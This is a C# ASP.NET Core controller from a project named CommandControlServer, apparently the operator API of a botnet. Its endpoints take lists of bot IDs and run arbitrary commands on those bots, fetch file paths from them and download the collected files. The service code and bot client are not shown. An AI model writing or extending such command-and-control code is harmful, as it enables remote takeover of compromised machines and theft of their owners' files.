using CommandControlServer.Api.Models;
using CommandControlServer.Api.DTOs;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using CommandControlServer.Api.Services;

namespace CommandControlServer.Api.Controllers
{
    public class FileRequest
    {
        public List<int> BotIds { get; set; } = new();
        public string FilePath { get; set; } = string.Empty;
    }

    public class CommandRequest
    {
        public List<int> BotIds { get; set; } = new();
        public string Command { get; set; } = string.Empty;
    }

    public class DownloadRequest
    {
        public List<int> BotIds { get; set; } = new();
        public string FilePath { get; set; } = string.Empty;
    }

    [Route("api/[controller]")]
    [ApiController]
    public class DataController : ControllerBase
    {
        private readonly IDataService _dataService;

        public DataController(IDataService dataService)
        {
            _dataService = dataService;
        }

        [HttpPost("execute/file")]
        public async Task<IActionResult> FetchFile([FromBody] FileRequest request)
        {
            try
            {
                var result = await _dataService.FetchFileAsync(request);
                return Ok(result);
            }
            catch (Exception ex)
            {
                return BadRequest($"Error fetching file: {ex.Message}");
            }
        }

        [HttpPost("execute/command")]
        public async Task<IActionResult> RunCommand([FromBody] CommandRequest request)
        {
            try
            {
                var result = await _dataService.RunCommandAsync(request);
                return Ok(result);
            }
            catch (Exception ex)
            {
                return BadRequest($"Error executing command: {ex.Message}");
            }
        }

        [HttpGet("download")]
        public async Task<IActionResult> DownloadFiles([FromQuery] DownloadRequest downloadRequest)
        {
            try
            {
                FileStreamResult result = await _dataService.FetchAndDownloadAsync(downloadRequest);
                return result;
            }
            catch (Exception ex)
            {
                return BadRequest($"Error downloading files: {ex.Message}");
            }
        }

    }
}
